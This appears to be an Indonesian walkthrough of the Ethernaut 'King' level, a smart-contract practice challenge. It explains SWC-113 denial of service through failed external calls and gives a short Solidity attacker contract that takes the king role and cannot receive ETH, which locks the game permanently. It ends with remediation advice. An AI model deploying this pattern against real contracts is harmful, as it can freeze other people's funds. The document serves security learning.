## king — Level 9

### Alur Logika Contract
pada contrct king aku membacanya seperti menjadi sebuah raja di contract iku ketika kita mengirim kan eth sebesar msg.value ke alamat yang sekarang dan begitu pun selanjut nya yang akna menjadi raja setelah nya dan misi kita bukan hanya jadi raja, tapi jadi raja yang tidak bisa digantikan karena contract kita menolak menerima ETH.

### Vulnerability
Nama: SWC-113
Penjelasan:Panggilan eksternal dapat gagal secara tidak sengaja atau sengaja, yang dapat menyebabkan kondisi DoS dalam kontrak. Untuk meminimalkan kerusakan yang disebabkan oleh kegagalan tersebut, lebih baik untuk mengisolasi setiap panggilan eksternal ke dalam transaksinya sendiri yang dapat dimulai oleh penerima panggilan. Ini sangat relevan untuk pembayaran, di mana lebih baik membiarkan pengguna menarik dana daripada mendorong dana kepada mereka secara otomatis (ini juga mengurangi kemungkinan masalah dengan batas gas).

### Impact
contract bida terkunci selamanya karena raja nya adalah contract yang tidak dapat menerima eth dan akan me revert jika di kirimkan
dan yang mrnjadi raja abadi adalah contract penyerang

### Cara Eksploit
kita menggunakan contract yang tidak dapat menerima eth dan tidak memiliki fungsi fallback dan mengisi contract nya dengan jumlah atau lebih dari amount raja sekarang pada kasus ini memiliki 0.001 eth contoh cntract nya seperti ini:
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract kingattack {
    
    constructor() payable {
        
    }

    function attack(address payable recipient, uint256 amount ) public {
       (bool success,) = recipient.call{value: amount}("");
        require(success, "Attack failed");
        
    }
}

### Rekomendasi Fix
Disarankan untuk mengikuti praktik terbaik panggilan:

Hindari menggabungkan beberapa panggilan dalam satu transaksi, terutama ketika panggilan dijalankan sebagai bagian dari loop
Selalu berasumsi bahwa panggilan eksternal bisa gagal
Menerapkan logika kontrak untuk menangani panggilan yang gagal